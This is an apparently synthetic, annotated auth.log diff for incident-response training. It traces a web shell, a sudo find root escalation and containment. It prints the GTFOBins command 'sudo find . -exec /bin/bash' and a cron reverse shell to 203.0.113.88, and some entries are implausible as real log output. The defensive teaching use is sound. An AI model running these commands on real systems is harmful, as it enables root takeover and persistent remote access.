@@ -1,0 +1,106 @@
+# /var/log/auth.log — Sanitized
+# Host: WEB-SERVER-01 (Ubuntu 22.04)
+# Window: 2024-05-21 14:28:00 UTC to 2024-05-21 14:55:00 UTC
+# -----------------------------------------------------------------------
+# NOTE: Hostname sanitized. User accounts are fictional.
+#       Log format: syslog standard (RFC 5424)
+# -----------------------------------------------------------------------
+
+
+# === SECTION 1: NORMAL BASELINE (pre-attack, for comparison) ===
+
+May 21 08:01:03 WEB-SERVER-01 sshd[1042]: Accepted publickey for deploy from 10.10.1.20 port 51234 ssh2
+May 21 08:01:03 WEB-SERVER-01 sshd[1042]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 21 12:30:17 WEB-SERVER-01 sudo: deploy : TTY=pts/0 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/systemctl restart apache2
+May 21 12:30:17 WEB-SERVER-01 sudo: pam_unix(sudo:session): session opened for user root by deploy(uid=1001)
+May 21 12:30:17 WEB-SERVER-01 sudo: pam_unix(sudo:session): session closed for user root by deploy(uid=1001)
+# Note: Above entries are normal — deploy user restarting apache via SSH
+
+
+# === SECTION 2: WEB SHELL UPLOAD WINDOW ===
+
+May 21 14:28:03 WEB-SERVER-01 apache2[3301]: pam_unix(apache2:session): session opened for user www-data
+# Note: Corresponds to web shell upload — apache handling POST /upload.php
+
+
+# === SECTION 3: PRIVILEGE ESCALATION ATTEMPTS ===
+
+# First sudo attempt — trying python3 as root (denied)
+May 21 14:41:03 WEB-SERVER-01 sudo: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3
+May 21 14:41:03 WEB-SERVER-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=
+
+# Second sudo attempt — trying /bin/bash directly (denied)
+May 21 14:41:31 WEB-SERVER-01 sudo: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+May 21 14:41:31 WEB-SERVER-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=
+
+# Third sudo attempt — trying vim (denied)
+May 21 14:42:10 WEB-SERVER-01 sudo: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim
+May 21 14:42:10 WEB-SERVER-01 sudo: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=
+
+# Fourth sudo attempt — /usr/bin/find ALLOWED ⚠️ (misconfigured sudoers)
+May 21 14:43:07 WEB-SERVER-01 sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find
+May 21 14:43:07 WEB-SERVER-01 sudo: pam_unix(sudo:session): session opened for user root by (uid=33)
+# ⚠️ CRITICAL: find is in /etc/sudoers as NOPASSWD for www-data
+#    Actual command run: sudo find . -exec /bin/bash \; -quit
+#    This is a known GTFOBins technique to spawn a root shell via find's -exec flag
+
+
+# === SECTION 4: ROOT SHELL OBTAINED ===
+
+May 21 14:43:09 WEB-SERVER-01 su[5821]: Successful su for root by www-data
+May 21 14:43:09 WEB-SERVER-01 su[5821]: + ??? root:www-data
+May 21 14:43:09 WEB-SERVER-01 su[5821]: pam_unix(su:session): session opened for user root by (uid=33)
+# ⚠️ ROOT SHELL CONFIRMED — www-data escalated to root via sudo find + GTFOBins
+
+
+# === SECTION 5: ROOT ACTIVITY ===
+
+May 21 14:43:15 WEB-SERVER-01 unix_chkpwd[5834]: password check failed for user (root)
+# Note: Attacker attempted to read /etc/shadow — file access logged
+
+May 21 14:44:31 WEB-SERVER-01 mysqld[2201]: Access granted for user 'webappuser'@'localhost'
+# Note: MySQL login with credentials stolen from config.php
+
+May 21 14:47:22 WEB-SERVER-01 cron[5901]: (root) BEGIN EDIT (root)
+May 21 14:47:28 WEB-SERVER-01 cron[5901]: (root) END EDIT (root)
+# ⚠️ Root crontab modified — reverse shell planted:
+#    * * * * * bash -i >& /dev/tcp/203.0.113.88/4444 0>&1
+
+May 21 14:48:01 WEB-SERVER-01 CRON[5912]: (root) CMD (bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
+# ⚠️ FIRST CRON EXECUTION — reverse shell fired at 14:48:01
+#    Subsequent executions every minute until cron job removed
+
+May 21 14:49:01 WEB-SERVER-01 CRON[5934]: (root) CMD (bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
+May 21 14:50:01 WEB-SERVER-01 CRON[5956]: (root) CMD (bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
+May 21 14:51:01 WEB-SERVER-01 CRON[5978]: (root) CMD (bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
+May 21 14:52:01 WEB-SERVER-01 CRON[6001]: (root) CMD (bash -i >& /dev/tcp/203.0.113.88/4444 0>&1)
+
+
+# === SECTION 6: INCIDENT RESPONSE — HOST ISOLATION ===
+
+May 21 14:52:14 WEB-SERVER-01 sshd[6022]: Accepted publickey for soc-analyst from 10.10.1.55 port 44821 ssh2
+May 21 14:52:14 WEB-SERVER-01 sshd[6022]: pam_unix(sshd:session): session opened for user soc-analyst by (uid=0)
+# Note: SOC analyst SSHed in to begin containment
+
+May 21 14:52:44 WEB-SERVER-01 sudo: soc-analyst : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -r
+# Analyst removes malicious cron job
+
+May 21 14:53:01 WEB-SERVER-01 sudo: soc-analyst : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/rm /var/www/html/uploads/img_cache/thumb_resize.php
+# Web shell removed
+
+May 21 14:53:22 WEB-SERVER-01 sudo: soc-analyst : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm -rf /tmp/.cache/
+# Attacker staging directory cleaned up
+
+May 21 14:53:55 WEB-SERVER-01 sudo: soc-analyst : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/iptables -I INPUT -s 203.0.113.88 -j DROP
+# Attacker IP blocked at host firewall level
+
+
+# -----------------------------------------------------------------------
+# ANALYST NOTES:
+# - www-data should NEVER appear in sudo logs — immediate red flag
+# - Four sudo attempts in 2 minutes = attacker methodically testing GTFOBins list
+# - find in sudoers with NOPASSWD is a critical misconfiguration
+# - Cron entries firing every minute = persistent reverse shell confirmed
+# - Remediation: audit /etc/sudoers and remove all GTFOBins-exploitable binaries
+#   (find, python, perl, vim, less, more, awk, nmap, etc.)
+# -----------------------------------------------------------------------
